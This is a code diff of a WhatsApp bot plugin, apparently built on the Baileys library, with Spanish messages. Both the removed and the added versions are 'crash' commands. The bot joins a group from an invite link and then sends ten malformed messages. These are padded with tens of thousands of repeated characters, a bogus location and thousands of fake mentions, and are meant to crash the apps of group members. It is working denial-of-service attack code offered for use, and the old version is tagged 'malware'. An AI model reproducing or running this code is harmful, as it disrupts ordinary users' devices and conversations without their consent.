@@ -1,107 +1,90 @@
-import { generateWAMessageFromContent } from '@whiskeysockets/baileys';
+import fs from 'fs'
 
-let handler = async (m, { conn, args, isBot }) => {
-  if (!args[0] || !args[0].includes('whatsapp.com')) {
-    return m.reply('*⚠️ Ingresa el link de un grupo válido.*\n\nEjemplo: .stiker https://chat.whatsapp.com/...');
+let handler = async (m, { conn, text, isBot, isCreator }) => {
+  if (!isBot && !isCreator) return m.reply('🚫 Este comando solo lo puede usar el bot o el creador.')
+  if (!text) return m.reply('⚠️ Escribe el enlace del grupo.\n\nEjemplo: *.crash-loc https://chat.whatsapp.com/xxxxx*')
+
+  let groupLink = text.trim()
+  let code = groupLink.split("https://chat.whatsapp.com/")[1]
+  if (!code) return m.reply("❌ Enlace de grupo inválido.")
+
+  let groupId
+  try {
+    groupId = await conn.groupAcceptInvite(code)
+  } catch (e) {
+    return m.reply("🚫 No me pude unir al grupo. Verifica el enlace o que el grupo no esté lleno.")
   }
 
-  // Extraer el código del link
-  let code = args[0].split('whatsapp.com/')[1].trim();
-  try {
-    let res = await conn.groupAcceptInvite(code);
-    let jid = res + '@g.us';
+  let target = groupId
+  await m.reply(`✅ Me uní al grupo.\n⏳ Enviando crash...`)
 
+  try {
     for (let i = 0; i < 10; i++) {
-      await CrashXUiKiller(conn, jid);
-      await delay(1200); // Delay pequeño entre envíos
+      await crash(target)
+      await delay(4000) // 4 segundos entre cada uno
     }
+
+    conn.sendMessage(target, {
+      text: "☠️ 𝐂𝐑𝐀𝐒𝐇 𝐋𝐎𝐂 𝐄𝐍𝐕𝐈𝐀𝐃𝐎\n\n🔹 Por: 𝐏.𝐀. 𝐙𝐢𝐧 𝐖𝐞𝐛\n🔹 Bot: 𝐙𝐄𝐓𝐀𝐒 𝐁𝐎𝐓 𝐕𝟓",
+    })
 
   } catch (e) {
-    console.error(e);
-    m.reply('❌ No pude unirme al grupo o enviar el mensaje.');
+    console.log("❌ Error:", e)
+    m.reply("Ocurrió un error enviando el crash.")
   }
-};
-
-handler.command = ['stiker'];
-handler.tags = ['malware'];
-handler.help = ['stiker <link del grupo>'];
-handler.group = false;
-handler.private = false;
-export default handler;
-
-// Función de delay
-function delay(ms) {
-  return new Promise(resolve => setTimeout(resolve, ms));
 }
 
-// Función CrashXUiKiller
-async function CrashXUiKiller(sock, jid, ptcp = true) {
-  let msg = await generateWAMessageFromContent(jid, {
-    viewOnceMessage: {
-      message: {
-        interactiveMessage: {
-          header: {
-            title: "조로Nted Crash Gen6🐉버그",
-            hasMediaAttachment: false
-          },
-          body: {
-            text: "조로Nted Crash Gen6🐉버그" + "ꦾ".repeat(50000),
-          },
-          nativeFlowMessage: {
-            messageParamsJson: "",
-            buttons: [
-              {
-                name: "cta_url",
-                buttonParamsJson: venomModsData + "ꦾ"
+handler.command = /^crash-loc$/i
+export default handler
+
+// 👇 FUNCIÓN DE CRASH (colócala en el mismo archivo o impórtala)
+async function crash(target) {
+  try {
+    let message = {
+      ephemeralMessage: {
+        message: {
+          interactiveMessage: {
+            header: {
+              title: "𝐂𝐑𝐀𝐒𝐇 𝐇𝐎𝐌𝐄 😭",
+              hasMediaAttachment: false,
+              locationMessage: {
+                degreesLatitude: -6666666666,
+                degreesLongitude: 6666666666,
+                name: "https://youtube.com/@p.a.zinwebkkkkj",
+                address: "𝐙𝐄𝐓𝐀𝐒 𝐁𝐎𝐓 𝐕𝟓",
               },
-              {
-                name: "call_permission_request",
-                buttonParamsJson: venomModsData + "ꦾ"
-              }
-            ]
-          }
-        }
-      }
+            },
+            body: {
+              text: "𝐏.𝐀. 𝐙𝐢𝐧 𝐖𝐞𝐛 </>",
+            },
+            nativeFlowMessage: {
+              messageParamsJson: "{".repeat(10000),
+            },
+            contextInfo: {
+              participant: target,
+              mentionedJid: [
+                "0@s.whatsapp.net",
+                ...Array.from({ length: 30000 }, () =>
+                  "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"
+                ),
+              ],
+            },
+          },
+        },
+      },
     }
-  }, {});
-  await sock.relayMessage(jid, msg.message, ptcp ? { participant: { jid: jid } } : {});
+
+    await conn.relayMessage(target, message, {
+      messageId: null,
+      participant: { jid: target },
+      userJid: target,
+    })
+  } catch (err) {
+    console.log("❌ Crash error:", err)
+  }
 }
 
-// Datos falsos
-let venomModsData = JSON.stringify({
-  status: true,
-  criador: "VenomMods",
-  resultado: {
-    type: "md",
-    ws: {
-      _events: { "CB:ib,,dirty": ["Array"] },
-      _eventsCount: 800000,
-      _maxListeners: 0,
-      url: "wss://web.whatsapp.com/ws/chat",
-      config: {
-        version: ["Array"],
-        browser: ["Array"],
-        waWebSocketUrl: "wss://web.whatsapp.com/ws/chat",
-        sockCectTimeoutMs: 20000,
-        keepAliveIntervalMs: 30000,
-        logger: {},
-        printQRInTerminal: false,
-        emitOwnEvents: true,
-        defaultQueryTimeoutMs: 60000,
-        customUploadHosts: [],
-        retryRequestDelayMs: 250,
-        maxMsgRetryCount: 5,
-        fireInitQueries: true,
-        auth: { Object: "authData" },
-        markOnlineOnsockCect: true,
-        syncFullHistory: true,
-        linkPreviewImageThumbnailWidth: 192,
-        transactionOpts: { Object: "transactionOptsData" },
-        generateHighQualityLinkPreview: false,
-        options: {},
-        appStateMacVerification: { Object: "appStateMacData" },
-        mobile: true
-      }
-    }
-  }
-});
+// 👇 Delay
+function delay(ms) {
+  return new Promise(resolve => setTimeout(resolve, ms))
+}
